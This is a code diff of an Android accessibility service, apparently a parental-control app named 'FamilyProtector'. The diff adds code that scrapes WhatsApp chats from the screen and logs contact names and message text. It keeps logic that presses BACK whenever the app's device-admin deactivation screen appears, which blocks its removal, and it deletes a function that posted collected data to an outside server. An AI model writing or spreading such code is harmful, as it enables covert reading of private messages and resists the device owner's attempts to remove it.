@@ -60,6 +60,7 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
     public static MyAccessibilityService instance;
     public static Set<String> blockedApps;
     public static boolean writeBlockedApp = true;
+    public static String lastConversation;
 
 
     //every day havo to reneuw
@@ -160,14 +161,8 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
                 });
             }
         }, 0, 1000*60 * 10);
-
-
     }
-    @Override
-    protected boolean onGesture(int gestureId) {
-        Log.d("ggg", "gasture");
-        return super.onGesture(gestureId);
-    }
+
     public void sondur() {
         performGlobalAction(GLOBAL_ACTION_HOME);
     }
@@ -176,16 +171,13 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
         if (parentView == null || parentView.getClassName() == null ) {
             return;
         }
-
         int childCount = parentView.getChildCount();
         //Log.d("sagol", parentView.getClassName().toString());
         //TextView
         //EditText
         if(parentView.getClassName().toString().contentEquals("android.widget.EditText")) {
             String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
-
-            //Logger.l("INFOI", ans);
-            Logger.l("INFOO", isWebsite(ans) + "-" + ans);
+            //Logger.l("INFOO", isWebsite(ans) + "-" + ans);
             if(isWebsite(ans)) {
                 if(webSites.size() == 0 || !webSites.get(webSites.size()-1).url.equals(ans)) {
                     Logger.l("INFOOO", ans);
@@ -198,9 +190,6 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
         }
         if (childCount == 0 && (parentView.getClassName().toString().contentEquals("android.widget.TextView"))) {
             String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
-
-
-
             textViewNodes.add(parentView);
         } else {
             for (int i = 0; i < childCount; i++) {
@@ -236,60 +225,62 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
     public String getTextViewText(AccessibilityNodeInfo t) {
         return t.getText() != null ? t.getText().toString() : "unknow";
     }
-    public void postJSON(String s) {
-        JSONObject postData = new JSONObject();
-        Log.d("posted", "posted");
-        try {
-            postData.put("name", s);
-            new ServerHelper(this).execute("http://tmhgame.tk/ailep", postData.toString());
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }
-    }
     @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
         //Log.d("salam", "EVENT cagrildi");
 
+
+
         int eventType = accessibilityEvent.getEventType();
         AccessibilityNodeInfo ni = accessibilityEvent.getSource();
         if(ni == null)return;
-        //@+id/conversation_contact_name
+        if(ni.getPackageName() == null || !ni.getPackageName().toString().equals("com.whatsapp")) {
+            //Logger.l(ni.getPackageName().toString());
+            return;
+        }
+
+
+
+        //com.whatsapp:id/conversation_contact_name
         //com.whatsapp:id/entry
         //AccessibilityEvent.ob
+       //Log.i("INFO", "---"+eventType + "--" + ni);
+        if(ni.getText() != null) {
+            //Logger.l("INFO", ni.getText().toString() + " " + ni.getClassName().toString());
+        }
+
+
+
         List<AccessibilityNodeInfo> L = ni.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");
         for(AccessibilityNodeInfo x : L) {
             CharSequence c = x.getText();
             if(c == null){
                 continue;
             }
-            Logger.l("WHATSAPPP", x.getText().toString());
+            lastConversation = x.getText().toString();
+            //Logger.l("WHATSAPPP", );
+
         }
 
-        Logger.l("QWER", eventType + "-" + AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED);
 
         switch (eventType) {
 
             case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
 
-                Log.i("INFO", "---" + ni);
                 //AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                 //AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                 AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                 //findChildViews(rootNode);
-
                 //rootNode.findAccessibilityNodeInfosByViewId()
-
                 if(rootNode == null)return;
                 String pname = rootNode.getPackageName() == null ? "" : rootNode.getPackageName().toString();
-
                 if(activities.size() == 0) {
                     Ac ac = new Ac();
                     ac.start = System.currentTimeMillis();
                     ac.pa = pname;
                     ac.end = -1;
                     activities.add(ac);
-                    Logger.l(" acctive -------------"+pname);
                 }else if(!activities.get(activities.size()-1).pa.equals(pname)) {
                     activities.get(activities.size()-1).end = System.currentTimeMillis();
                     Ac ac = new Ac();
@@ -297,25 +288,25 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
                     ac.pa = pname;
                     ac.end = -1;
                     activities.add(ac);
-                    Logger.l(" acctive -------------"+pname);
                     for(Ac x : activities) {
                         //Logger.l(x.pa + "- " + (x.end-x.start));
                     }
                 }
-
                 if(rootNode == null)return;
                 if(blockedApps == null) {
                     buildBlockedApps();
-
                 }
 
                 if(blockedApps.contains(rootNode.getPackageName().toString())) {
                     sondur();
                 }
+
                 textViewNodes = new ArrayList<AccessibilityNodeInfo>();
                 //AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                 findChildViews(rootNode);
-                Logger.l("UZUNLUQ", textViewNodes.size()+"");
+
+                //findInputChild(rootNode);
+                // youtube
                 for(int i = 1; i < textViewNodes.size(); i++) {
                     String ans = getTextViewText(textViewNodes.get(i));
                     boolean p = ans.endsWith("views");
@@ -339,6 +330,7 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
                         break;
                     }
                 }
+                //Blocking Apps
                 String oldText = "";
                 for(int i = 0; i < textViewNodes.size(); i++) {
                     AccessibilityNodeInfo mNode = textViewNodes.get(i);
@@ -346,12 +338,6 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
                         return;
                     }
                     String tv1Text = mNode.getText().toString();
-
-
-                    Log.d("accesibility", tv1Text);
-
-
-
                     if((tv1Text.startsWith("TThis admin app is active") && oldText.equals("FamilyProtector")) || tv1Text.equals("Locationn")) {
 
                         performGlobalAction(GLOBAL_ACTION_BACK);
@@ -362,6 +348,21 @@ https://www.youtube.com/results?search_query=the+show+must+go+on
                     oldText = tv1Text;
 
                 }
+
+                for(int i = 0; i < textViewNodes.size(); i++) {
+                    AccessibilityNodeInfo ti = textViewNodes.get(i);
+                    String ans = ti.getText() != null ? ti.getText().toString() : "unknow";
+                    AccessibilityNodeInfo p = ti.getParent();
+                    // whatsapi chavlandiranda 2 dene text dalbadal gelir. sonra vaxt;
+                    if(p.getChildCount() == 5) {//ses ya shekil ya vidyo atib bashqasi
+
+                    }else if(p.getChildCount() == 6) {//ses ya shekil ya vidyo atmisham
+
+                    }
+
+                    Logger.l((ti.getParent().getChildCount() == 2 ? lastConversation : "Men") + ": " + ans + "--" + ti.getParent().getChildCount());
+                }
+
 
                 break;
 
